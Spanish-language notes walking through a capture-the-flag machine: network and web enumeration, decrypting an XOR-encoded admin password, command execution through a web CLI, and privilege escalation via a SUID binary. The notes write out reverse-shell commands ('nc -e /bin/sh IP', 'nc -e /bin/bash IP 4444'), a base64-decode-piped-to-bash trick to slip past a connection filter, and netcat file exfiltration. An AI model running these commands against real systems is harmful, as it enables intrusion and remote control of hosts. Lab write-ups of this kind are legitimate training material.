
Realizamos un netdiscover para encontrar la ip de la máquina vulnerable:

![[Pasted image 20241023154042.png]]

Seguidamente, lanzaremos un nmap para encontrar los puertos vulnerables:

![[Pasted image 20241023154603.png]]
nmap -A IP -T5.
- -A: representa lo mismo que **-p- --open -sSCV -n -Pn**. (puertos, abiertos, tipo de escaneo, no resuelve los  DNS, no comprobar que el host no esté *up*).

Encontraremos 3 puertos abiertos:

![[Pasted image 20241023154243.png]]

Probaremos por web para encontrar alguna información:

![[Pasted image 20241023154334.png]]

Se ve que sale un Bad Request (400), pero al inspeccionar veremos que es una resolución en html, y no un error de petición como dice.

![[Pasted image 20241023154419.png]]

Probamos a entrar al host encontrado:![[Pasted image 20241023154957.png]]
![[Pasted image 20241023155008.png]]


Ahora vamos a ver el host desde el echo.

![[Pasted image 20241023155209.png]]

**NOTA**: Ir con cuidado con los >>:
- > = eliminar el contenido (sustituye) 
- **>>*** = agregar contenido.
	- Para ir con cuidado, hacer una copia con **cp /etc/hosts /etc/hosts.bak**
	- ![[Pasted image 20241023155620.png]]

Ahora probamos de nuevo el DNS:

![[Pasted image 20241023155738.png]]

Y con la configuración hecha, ya podemos ver la página.

Como no tenemos nada de información relevante, vamos a proceder con un gobuster. En este caso, usaremos el **dirb**. También existe el **dirbuster**.

![[Pasted image 20241023161733.png]]

Entrando al **robots.txt**, nos dará lo siguiente:
![[Pasted image 20241023161825.png]]

Ahora, probaremos todas las extensiones gracias a ![[Pasted image 20241023161924.png]]

Encontraremos que la **.txt** nos funciona:

![[Pasted image 20241023162020.png]]


Iremos al **testdata.txt**:

![[Pasted image 20241023162408.png]]

Nos encontramos en un sistema de decodificación. Necesitamos 3 variables. Encriptación, algoritmo de encriptación y la key de encriptación.

**NOTA**: Prograna cyberchef nos permite:
	- Desencriptar mensajes.

Probando con el programa **cyberchef**, con la key y el mensaje encriptado, junto con el algoritmo que sabemos que es el XOR, nos da lo siguiente:

![[Pasted image 20241023163152.png]]

Ahora tenemos un usuario sacado del testingnotes.txt:
![[Pasted image 20241023163720.png]]
Y una contraseña desencriptada:
![[Pasted image 20241023163746.png]]

Así que entraremos en el apartado admin:
![[Pasted image 20241023163818.png]]

![[Pasted image 20241023163836.png]]
![[Pasted image 20241023163856.png]]

Y al ser un CLI, funcionará como una consola de comandos. Por ejemplo, un **ls -al**.
![[Pasted image 20241023163929.png]]


Probaremos que se abra un canal a nuestra máquina con el comando **nc -e /bin/sh IP** :

![[Pasted image 20241023164054.png]]
Veremos que no nos deja abrir canales, que las conexiones remotas no son posibles.

Querremos saber si tenemos permisos sobre algo.
Primero, nos dirigiremos a /home, nos de un listado de lo que hay dentro del directorio, y donde me encuentro:
![[Pasted image 20241023164358.png]]
**NOTA**: La diferencia entre | y ; es que el pipe (|) te ejecuta todo de golpe, mientras que el punto y coma (;) concatena las instrucciones una a una.

Si tenemos acceso al directorio de variables (/var), podremos hacer algo.![[Pasted image 20241023165057.png]]
Encontramos que earth_web tiene acceso de drwxr-xr-x (directorio, lectura-escritura-ejecución-lectura, ejecución-lectura, ejecución)

Para encontrar acceso a ese directorio, probaremos con un netcut:

![[Pasted image 20241023165516.png]]

Usamos el 4444 porque el 443 ya está en uso.

Ahora haremos un **nc -e /bin/bash IP 4444**![[Pasted image 20241023165804.png]]

Nos dice que sigue estando prohibido las conexiones remotas.

Ahora lo probaremos con un base64. Codificando el comando.
![[Pasted image 20241023165914.png]]

Ahora nos iremos otra vez al CLI y haremos un reverse.

**echo '![[Pasted image 20241023165941.png]]' | base64 -d | -bash**.
Con el bash, lo que forzamos es que lo que me va a decompilar me lo ejecute como un script.

La página se va a quedar pensando, y nosotros ya tendremos acceso:
![[Pasted image 20241023170525.png]]

Buscaremos:
	**- /:** desde la raíz.
	**- -perm:** donde tenga permisos.
	-  **-u=s**: otorgarnos permisos
	**- -type:** tipo de fichero
	**- 2>**: error, mayor 2
	**- /dev/null:** carpeta.

![[Pasted image 20241023170941.png]]

Nos percatamos que hay el directorio /usr/bin/reset_root.

![[Pasted image 20241023171025.png]]

Vemos el contenido del directorio, pero si lo queremos ejecutar:
![[Pasted image 20241023171110.png]]
Veremos que no podemos porque no todo está presente. Para llevárnoslo a nuestra máquina, al no poderse usar el get ni tener el puerto ftp abierto:
1. Abrimos una terminal nueva
2. Abrimos una nueva escucha, pero lo que reciba lo mande al archivo **reset_root**.
 ![[Pasted image 20241023171351.png]]

Ahora, listamos el archivo de **reset_root**, mandándolo a una IP en concreto, con el puerto abierto.
![[Pasted image 20241023171846.png]]![[Pasted image 20241023171859.png]]
![[Pasted image 20241023171904.png]]
Miramos el contenido, pero no podemos interpretarlo.
![[Pasted image 20241023171923.png]]

Para descifrarlo, usaremos ingeniería inversa, pasando el ejecutable a código fuente, usando LTRACE.
![[Pasted image 20241023172147.png]]

Damos permisos al reset_root y vemos los archivos necesarios para ejecutarlos.
![[Pasted image 20241023172829.png]]

En la máquina, vamos a obtener los archivos, ejecutar el reset_root, y ya entraremos al root:

![[Pasted image 20241023172907.png]]



